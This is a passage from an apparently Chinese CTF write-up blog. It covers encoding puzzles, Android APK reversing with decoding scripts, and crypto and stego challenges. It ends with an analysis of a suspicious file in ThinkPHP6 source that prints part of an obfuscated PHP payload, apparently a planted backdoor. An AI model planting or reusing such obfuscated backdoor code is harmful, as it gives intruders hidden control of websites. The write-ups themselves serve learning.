⠤⠨⠨⠤⠤⠌⠤⠨⠨⠨⠨⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠨⠨⠨⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠨⠤⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠨⠤⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠨⠨⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠨⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠨⠨⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠨⠨⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠨⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠨⠤⠌⠤⠨⠨⠨⠨ 转换一下，得到摩斯电码 ..-/--.../--..--/-----/--.../--..--/---../...--/--..--/.-../....-/--..--/..---/....-/--..--/..---/--.../--..--/.-.-/-..../--..--/...-/....-/--..--/....-/--.../--..--/---../...../--..--/---../--.../--..--/...-/-..../--..--/---../...--/--..--/.----/--.../--..--/--.../...--/--..--/...-/....-/--..--/-./....-/--..--/----./--.../--..--/--.../...../--..--/..-/-..../--..--/.-../....-/--..--/.----/--.../--..--/./-..../--..--/----./...../--..--/---../...--/--..--/.----/--.../--..--/..-/....-/--..--/...-/....-/--..--/.----/...--/--..--/.-.-/....-/--..--/--.../...../--..--/-..../....-/--..--/--.../....-/--..--/-----/--.../--..--/./-..../--..--/.----/....-/--..--/-..../--.../--..--/-----/...--/--..--/---../--.../--..--/..---/...../--..--/....-/--.../--..--/.-.-/-..../--..--/-..../...--/--..--/.----/...../--..--/.----/....-/--..--/--.../...--/--..--/--.../--.../--..--/-..../-..../--..--/....-/--.../--..--/--.../...--/--..--/.-.-/-..../--..--/..-/....-/--..--/./....-/--..--/....-/-..../--..--/...../-..../--..--/....-/....-/--..--/...../...--/--..--/---../-..../--..--/....-/....-/--..--/....-/-.... 解码得到 u7,07,83,l4,24,27,ā6,v4,47,85,87,v6,83,17,73,v4,n4,97,75,u6,l4,17,e6,95,83,17,u4,v4,13,ā4,75,64,74,07,e6,14,67,03,87,25,47,ā6,63,15,14,73,77,66,47,73,ā6,u4,e4,46,56,44,53,86,44 感觉这个解码很不对劲，尝试把摩斯电码reverse ....-/-..../--..--/-..../-..../--..--/....-/..---/--..--/--.../...../--..--/-..../-..../--..--/....-/...../--..--/....-/-..../--..--/-...././--..--/-..../-../--..--/....-/-.-./--..--/--.../...--/--..--/...--/-..../--..--/....-/....-/--..--/...--/...--/--..--/--.../...--/--..--/-..../----./--..--/...../----./--..--/--.../....-/--..--/....-/-.-./--..--/...--/-..../--..--/...../---../--..--/...--/..---/--..--/--.../-----/--..--/...--/....-/--..--/-..../----./--..--/....-/./--..--/...--/-----/--..--/-..../...--/--..--/-..../....-/--..--/...../...--/--..--/-..../-.-./--..--/--.../----./--..--/-..../-.../--..--/-..../-../--..--/...--/----./--..--/--.../..---/--..--/...../.----/--..--/....-/./--..--/...--/----./--..--/-..../..-./--..--/....-/-../--..--/...../...--/--..--/...--/.----/--..--/-..../.-/--..--/-..../-.../--..--/--.../...--/--..--/...--/----./--..--/--.../..---/--..--/....-/-.../--..--/...--/..---/--..--/...../..---/--..--/...--/-..../--..--/-..../-.../--..--/....-/-.-./--..--/...--/---../--..--/-..../---../--..--/-..../..-./--..--/--.../..---/--..--/...--/-----/--..--/...--/-.. 得到 46,66,42,75,66,45,46,6E,6D,4C,73,36,44,33,73,69,59,74,4C,36,58,32,70,34,69,4E,30,63,64,53,6C,79,6B,6D,39,72,51,4E,39,6F,4D,53,31,6A,6B,73,39,72,4B,32,52,36,6B,4C,38,68,6F,72,30,3D 然后再转hex FfBufEFnmLs6D3siYtL6X2p4iN0cdSlykm9rQN9oMS1jks9rK2R6kL8hor0=\r尝试base64无果，就卡在这里了。 学习wp知道，这里需要用维基利亚解密。 YzBibXZnaHl6X3swUmF6X2d4eG0wdGhrem9fMG9iMG1fdm9rY2N6dF8hcn0=\r然后得到 c0bmvghyz","date":"2022-01-29","objectID":"/2022-01-29-hgame-2022-week1writeup/:12:0","tags":["Web安全","CTF"],"title":"HGAME 2022 week1(writeup)","uri":"/2022-01-29-hgame-2022-week1writeup/"},{"categories":["WriteUp"],"content":"0x0C Dancing Line(复现) 描述 这条路弯弯曲曲的，到底通向哪里呢？ 老实说，这题毫无头绪。 wp上说一个字符的 ASCII码有 8 位，图像中的每两个黑色色块间的路程也为 8 步。从左上角的色块出发，向右为 0，向下为 1，连起来就是对应字符的 ASCII 码。 import numpy as np\rfrom PIL import Image\r# 判断下一步往哪走\rdef search(arr, x, y):\rif y+1\u003carr.shape[1] and (arr[x, y+1, :] != 255).all():\rreturn x, y+1, 0\relif x+1\u003carr.shape[0]:\rreturn x+1, y, 1\relse:\rreturn -1, -1, -1\rif __name__ == \"__main__\":\rimage = Image.open(\"Dancing Line.bmp\")\rarray = np.array(image)\rx = y = 0\rwhile True:\rasc = 0\r# 每八步拼接成一个字符的 ASCII 码\rfor _ in range(8):\rx, y, v = search(array, x, y)\rif v\u003c0:\rexit()\rasc \u003c\u003c= 1\rasc |= v\rprint(chr(asc), end = \"\") ","date":"2022-01-29","objectID":"/2022-01-29-hgame-2022-week1writeup/:13:0","tags":["Web安全","CTF"],"title":"HGAME 2022 week1(writeup)","uri":"/2022-01-29-hgame-2022-week1writeup/"},{"categories":["WriteUp"],"content":"\r","date":"2022-01-13","objectID":"/2022-01-13-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-moblie%E6%96%B0%E6%89%8B%E7%AF%871/:0:0","tags":["Web安全","CTF"],"title":"攻防世界-moblie（新手篇1）","uri":"/2022-01-13-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-moblie%E6%96%B0%E6%89%8B%E7%AF%871/"},{"categories":["WriteUp"],"content":"0x00 easyjni JNI（Java Native Interface）即java本地接口，众所周知，android有四层结构，应用层与应用接口层是用Java写的，而C/C++核心库和linux内核层由C/C++写的，既然知道了这一点，那理解JNI就很简单了，Java和C/C++肯定是不能直接互相调用的，那么应用层肯定就不能直接调用底层的东西，比如从应用层直接用Java想调用底层C/C++开发的启动相机或NFC等肯定是不能直接实现的。 安装apk，是一个验证flag的程序。 使用jeb查看反编译代码，在主函数找到check的判断语句。初始化一个a类locala，并把输入进去的String类型的字符串穿换成Byte[]类型组传入a类locala的a方法。 程序开头加载了库，与传入的字符串进行ncheck，最后返回一个布尔型的值。 猜测调用的a类是base64变码表，循环长度为3，数组长度为4，最后补“=”。 将so文件导入ida，搜索ncheck定位到关键函数 分析第一个循环，是将前16位与后16位交换位置。 for ( i = 0; i != 16; ++i )\r{\rv7 = \u0026v12[i];\rv12[i] = v5[i + 16];\rv8 = v5[i];\rv7[16] = v8;\r}\r分析第二个循环，是将字符两两交换位置。 do\r{\rv10 = v9 \u003c 30;\rv13 = v12[v9];\rv12[v9] = v12[v9 + 1];\rv12[v9 + 1] = v13;\rv9 += 2;\r}\rwhile ( v10 );\r编写脚本如下： import base64 c = \"MbT3sQgX039i3g==AQOoMQFPskB1Bsc7\" tmp = \"\" for i in range(len(c)//2): tmp += c[i*2+1] + c[i*2] #两两交换 new_c = tmp[16:] + tmp[:16] #前后交换 string1 = str.maketrans(\"i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN\",\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\") strEnBase64 = new_c.translate(string1) strFlag = base64.b64decode(strEnBase64) print(strFlag) maketrans和translate方法简介： Python maketrans() 方法用于创建字符映射的转换表，translate() 方法根据参数table给出的表(包含 256 个字符)转换字符串的字符。 实例如下： intab = \"aeiou\"\routtab = \"12345\"\rtrantab = str.maketrans(intab, outtab) # 制作翻译表\rstr = \"this is string example....wow!!!\"\rprint (str.translate(trantab))\r结果：th3s 3s str3ng 2x1mpl2....w4w!!!\r","date":"2022-01-13","objectID":"/2022-01-13-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-moblie%E6%96%B0%E6%89%8B%E7%AF%871/:1:0","tags":["Web安全","CTF"],"title":"攻防世界-moblie（新手篇1）","uri":"/2022-01-13-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-moblie%E6%96%B0%E6%89%8B%E7%AF%871/"},{"categories":["WriteUp"],"content":"0x01 easy-apk 简单看下功能，也是一个验证flag的功能。 上jeb，在主函数看到它的判断逻辑。 阅读后发现Base64New类是base64变码表 编写脚本如下: import base64\rc = \"5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=\"\rchanged = \"vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/\"\rorigin = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\rs = str.maketrans(changed, origin)\rs_EnBase64 = c.translate(s)\rflag = base64.b64decode(s_EnBase64)\rprint(flag)\r得到flag ","date":"2022-01-13","objectID":"/2022-01-13-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-moblie%E6%96%B0%E6%89%8B%E7%AF%871/:2:0","tags":["Web安全","CTF"],"title":"攻防世界-moblie（新手篇1）","uri":"/2022-01-13-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-moblie%E6%96%B0%E6%89%8B%E7%AF%871/"},{"categories":["WriteUp"],"content":"0x02 app1 按照惯例查看功能 jeb分析，在主函数发现验证的逻辑，可以发现flag的值其实就是v3的每个字符和v4异或拼凑的结果。 找到v3、v4的值，编写脚本。 v3 = \"X\u003ccP[?PHNB\u003cP?aj\"\rv4 = 15\rflag = \"\"\rfor i in v3:\rx = ord(i)^v4\rflag += chr(x)\rprint(flag)\r得到flag ","date":"2022-01-13","objectID":"/2022-01-13-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-moblie%E6%96%B0%E6%89%8B%E7%AF%871/:3:0","tags":["Web安全","CTF"],"title":"攻防世界-moblie（新手篇1）","uri":"/2022-01-13-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-moblie%E6%96%B0%E6%89%8B%E7%AF%871/"},{"categories":["WriteUp"],"content":"0x03 app2 这次是个登录界面。 jeb分析SecondActivity代码，ili是用户名，lil是密码，他们加密后等于需要等于VEIzd/V2UPYNdn/bxH3Xig== 加密的函数来自so文件 将so文件导入ida，搜索doRawData定位到关键函数 ，发现一个key值和AES_128_ECB_PKCS5Padding_Encrypt的字样，应该是AES加密。 文本解密后发现不正确，在XML里面发现FileDataActivity从来没有用过 点击发现有一段字符串，且使用了Encrypto的解密函数。 编写python脚本 import base64\rfrom Crypto.Cipher import AES\rc = base64.b64decode(\"9YuQ2dk8CSaCe7DTAmaqAA==\") key = b'thisisatestkey=='\raes = AES.new(key,AES.MODE_ECB)\rflag = aes.decrypt(c)\rprint(flag)\r","date":"2022-01-13","objectID":"/2022-01-13-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-moblie%E6%96%B0%E6%89%8B%E7%AF%871/:4:0","tags":["Web安全","CTF"],"title":"攻防世界-moblie（新手篇1）","uri":"/2022-01-13-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-moblie%E6%96%B0%E6%89%8B%E7%AF%871/"},{"categories":["WriteUp"],"content":"0x04 app3 ab文件没见过，搜索发现https://blog.csdn.net/qq_33356474/article/details/92188491，使用abe.jar unpack app3.ab app3.tar得到文件夹，发现apk文件和Encryto.db。 jeb分析代码，在MainActivity中能看到一些信息，怀疑flag加密在数据库文件之中，最后调用了a函数。 分析发现需要把v1.a(v2 + v1.b(v2, v0.getAsString(\"password\"))).substring(0, 7)的值给捋清楚。 结合下面图中的代码，分析v2的值是Stra1234，v0.getAsString(\"password\")的值是123456，然后剩下的看代码是MD5和SHA-1的加密这里直接用它的代码，把v2，v0等值赋过去就好。 参考https://www.52pojie.cn/thread-1082706-1-1.html代码如下： import java.security.MessageDigest; import java.util.*; public class b { public b() { super(); } public static void main(String[] args) { String varV2 = \"Stra1234\"; String varV1B = a(varV2); String varKey = varV2 + varV1B + \"yaphetshan\"; System.out.print(\"KEY = \"); System.out.print(b(varKey).substring(0,7)); } public static final String a(String arg9) { String v0_2; int v0 = 0; char[] v2 = new char[]{'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'}; try { byte[] v1 = arg9.getBytes(); MessageDigest v3 = MessageDigest.getInstance(\"MD5\"); v3.update(v1); byte[] v3_1 = v3.digest(); int v4 = v3_1.length; char[] v5 = new char[v4 * 2]; int v1_1 = 0; while(v0 \u003c v4) { int v6 = v3_1[v0]; int v7 = v1_1 + 1; v5[v1_1] = v2[v6 \u003e\u003e\u003e 4 \u0026 15]; v1_1 = v7 + 1; v5[v7] = v2[v6 \u0026 15]; ++v0; } v0_2 = new String(v5); } catch(Exception v0_1) { v0_2 = null; } return v0_2; } public static final String b(String arg9) { String v0_2; int v0 = 0; char[] v2 = new char[]{'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'}; try { byte[] v1 = arg9.getBytes(); MessageDigest v3 = MessageDigest.getInstance(\"SHA-1\"); v3.update(v1); byte[] v3_1 = v3.digest(); int v4 = v3_1.length; char[] v5 = new char[v4 * 2]; int v1_1 = 0; while(v0 \u003c v4) { int v6 = v3_1[v0]; int v7 = v1_1 + 1; v5[v1_1] = v2[v6 \u003e\u003e\u003e 4 \u0026 15]; v1_1 = v7 + 1; v5[v7] = v2[v6 \u0026 15]; ++v0; } v0_2 = new String(v5); } catch(Exception v0_1) { v0_2 = null; } return v0_2; } } 编译运行得到ae56f99 解密文件，得到flag的base64值。 ","date":"2022-01-13","objectID":"/2022-01-13-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-moblie%E6%96%B0%E6%89%8B%E7%AF%871/:5:0","tags":["Web安全","CTF"],"title":"攻防世界-moblie（新手篇1）","uri":"/2022-01-13-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-moblie%E6%96%B0%E6%89%8B%E7%AF%871/"},{"categories":["WriteUp"],"content":"0x05 easy-so 放到模拟器，字符串验证。 上jeb，找到关键代码，开始分析。 CheckString在so文件里面，上ida分析。 简单分析代码 第一部分代码逻辑如下： v3 = strlen(v11);//v3是v11的字符串长度\rv4 = (char *)malloc(v3 + 1);//为v4请求v3+1长度的内存空间\rmemset(\u0026v4[v3], 0, v3 != -1);//将v4扩增一倍并后面扩增的部分初始化为0，v4=----0000\rmemcpy(v4, v11, v3);//将v11的内容复制到v4中\rif ( strlen(v4) \u003e= 2 )//若v4的长度大于等于2\r{\rv5 = 0;\rdo\r{\rv6 = v4[v5];\rv4[v5] = v4[v5 + 16];\rv4[v5++ + 16] = v6;\r}\rwhile ( v5 \u003c strlen(v4) \u003e\u003e 1 );//在v5小于v4长度的一半时，将v4的第v5个字符与第v5+16个字符交换位置\r}\rvoid *memset(void *str, int c, size_t n) 复制字符 c（一个无符号字符）到参数 str 所指向的字符串的前 n 个字符。\rstr -- 指向要填充的内存块。\rc -- 要被设置的值。该值以 int 形式传递，但是函数在填充内存块时是使用该值的无符号字符形式。\rn -- 要被设置为该值的字符数。\rvoid *memcpy(void *str1, const void *str2, size_t n) 从存储区 str2 复制 n 个字节到存储区 str1。\rstr1 -- 指向用于存储复制内容的目标数组，类型强制转换为 void* 指针。\rstr2 -- 指向要复制的数据源，类型强制转换为 void* 指针。\rn -- 要被复制的字节数。\r第二段代码逻辑如下： v7 = *v4;//指针v7指向v4\rif ( *v4 )//如果v4存在\r{\r*v4 = v4[1];\rv4[1] = v7;\rif ( strlen(v4) \u003e= 3 )//v4的长度大于等于3\r{\rv8 = 2;\rdo\r{\rv9 = v4[v8];\rv4[v8] = v4[v8 + 1];\rv4[v8 + 1] = v9;\rv8 += 2;\r}\rwhile ( v8 \u003c strlen(v4) );//两两交换\r}\r}\r最后的结果为f72c5a36569418a20907b55be5bf95ad，那么我们可以编程逆退回去。 c = \"f72c5a36569418a20907b55be5bf95ad\"\rtmp = \"\"\r#两两交换\rfor i in range(len(c)//2):\rtmp += c[i*2+1] + c[i*2]\r#前后交换\rflag = tmp[16:] + tmp[:16]\rprint(flag)\r","date":"2022-01-13","objectID":"/2022-01-13-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-moblie%E6%96%B0%E6%89%8B%E7%AF%871/:6:0","tags":["Web安全","CTF"],"title":"攻防世界-moblie（新手篇1）","uri":"/2022-01-13-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-moblie%E6%96%B0%E6%89%8B%E7%AF%871/"},{"categories":["WriteUp"],"content":"0x00 前言 长安战疫的题目还挺友好的，但有的知识点当时没有联系到，赛后做个复现，总结学习一下。 ","date":"2022-01-12","objectID":"/2022-01-12-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABmisccrypto%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/:1:0","tags":["CTF"],"title":"长安战疫(Misc+Crypto)赛题复现","uri":"/2022-01-12-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABmisccrypto%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"},{"categories":["WriteUp"],"content":"0x01 no_math_no_cry from Crypto.Util.number import* from secret import flag assert len(flag) \u003c= 80 def sec_encry(m): cip = (m - (1\u003c\u003c500))**2 + 0x0338470 return cip if __name__ == \"__main__\": m = bytes_to_long(flag) c = sec_encry(m) print(c) # 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169 当时比赛时是直接推出cip = gmpy2.iroot((c - 0x0338470),2)[0] + (1\u003c\u003c500)，结果死活求不出flag，赛后才发现开平方后可能是负数，所以正确的脚本应该如下： def sec_decry(c):\rcip1 = (1\u003c\u003c500) - gmpy2.iroot((c - 0x0338470),2)[0] cip2 = (1\u003c\u003c500) + gmpy2.iroot((c - 0x0338470),2)[0] return cip1,cip2\rif __name__ == \"__main__\":\rm1,m2 = sec_decry(c)\rflag1 = long_to_bytes(m1)\rflag2 = long_to_bytes(m2)\rprint('flag1:',flag1,'\\nflag2:',flag2)\r","date":"2022-01-12","objectID":"/2022-01-12-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABmisccrypto%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/:2:0","tags":["CTF"],"title":"长安战疫(Misc+Crypto)赛题复现","uri":"/2022-01-12-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABmisccrypto%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"},{"categories":["WriteUp"],"content":"0x02 无字天书 追踪http流，发现504b开头的数据，疑似zip包，把他导出来。 解压出来得到两个东西，都是空白的。 key.ws是whitespace编码，导入https://www.dcode.fr/whitespace-language，可以解出key值为XiAnWillBeSafe flag.txt是snow编码，利用工具SNOW.exe -p \"XiAnWillBeSafe\" -C flag.txt求解，特别注意密码要用双引号不能是单引号，最后得到cazy{C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng} ","date":"2022-01-12","objectID":"/2022-01-12-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABmisccrypto%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/:3:0","tags":["CTF"],"title":"长安战疫(Misc+Crypto)赛题复现","uri":"/2022-01-12-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABmisccrypto%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"},{"categories":["WriteUp"],"content":"0x03 Ez_Steg 压缩包提示Password is six number，爆破得出220101，然后得到emoji.txt和一个pyc文件，起初以为pyc文件是要反编译成py然后求出key，和emoji通过解密得到flag。后来看wp发现，pyc文件存在Pyc字节码隐写，找到魔改的https://github.com/c10udlnk/stegosaurus后，执行./stegosaurus -x steg.pyc对pyc文件的隐藏文本进行提取，最后得到St3g1sV3ryFuNny。 然后在https://aghorler.github.io/emoji-aes/进行求解，得到cazy{Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke} ","date":"2022-01-12","objectID":"/2022-01-12-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABmisccrypto%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/:4:0","tags":["CTF"],"title":"长安战疫(Misc+Crypto)赛题复现","uri":"/2022-01-12-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABmisccrypto%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"},{"categories":["WriteUp"],"content":"0x04 西安加油-gaps解法 因为图片都是规则的正方形，所以可以考虑使用imagick结合gaps，使用magick montage *.png -tile 8x6 -geometry +0+0 flag.png，得到一张初具轮廓的图。 看下单张的详细信息 执行gaps --image=flag.png --generation=30 --population=300 --size=100得出完整拼图。 ","date":"2022-01-12","objectID":"/2022-01-12-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABmisccrypto%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/:5:0","tags":["CTF"],"title":"长安战疫(Misc+Crypto)赛题复现","uri":"/2022-01-12-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABmisccrypto%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"},{"categories":["WriteUp"],"content":"0x05 math pinvq:0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3 qinvp:0x79388eb6c541fffefc9cfb083f3662655651502d81ccc00ecde17a75f316bc97a8d888286f21b1235bde1f35efe13f8b3edb739c8f28e6e6043cb29569aa0e7b c:0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386 e:0x10005 d:0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1 先整理一下已知量，e、d、c和 invert(p,q) 、invert(q,p)，设置invert(p,q) 、invert(q,p)分别为_q和_p。参考：https://scerush.github.io/2020/09/17/ctf-show-unusualrsa4/ e*d=1+k*phi，由此可以暴力枚举k值来破解phi。\rp*_q mod q ≡1,q*_p mod p ≡1\rphi = (p - 1) * (q - 1) ≡ n - p - q+1\r(_p * phi) mod p ≡ _p * (n - p - q + 1) mod p ≡ (_p - _p*q) mod p ≡ (_p - 1) mod p\r(_p * phi + 1 - _p) ≡ 0 mod p\r设(_p * phi + 1 - _p)为X,p能被X整除\r由 _p * q ≡ 1 mod p 可计算出 q ，最后得到m。 脚本如下： from gmpy2 import *\rfrom Crypto.Util.number import *\r_p = qinvp\rposs_phi = []\rfor i in range(1,e):\rphi = e * d -1 if phi%i == 0:\rphi = phi//i\rdd = invert(e,phi)\rif dd == d:\rposs_phi.append(phi)\rfor phi in poss_phi:\rtry:\rx = 1 + _p * phi - _p\ry1 = pow(5, phi, x) - 1\ry2 = pow(3, phi, x) - 1\ry3 = pow(2, phi, x) - 1\rp = gcd(gcd(y1, y2),y3)\rq = invert(_p, p)\rn = p * q\rm = pow(c, d, n)\rflag = long_to_bytes(m)\rif b'flag' in flag:\rprint(flag)\rexcept:\rcontinue\r","date":"2022-01-12","objectID":"/2022-01-12-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABmisccrypto%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/:6:0","tags":["CTF"],"title":"长安战疫(Misc+Crypto)赛题复现","uri":"/2022-01-12-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABmisccrypto%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"},{"categories":["WriteUp"],"content":"0x06 ez_Encrypt 追踪流，在第10个流发现疑似base64的字符串，导出解码后得到一个压缩包。 发现是ThinkPHP6的源码 D盾扫描发现可疑文件。 打开/app/contoller/Index.php发现存在php代码混淆。 将eval改成echo，在线运行，查看相应的结果。 得到结果后，将eval改成echo，再次运行。 $VCBZQW=\"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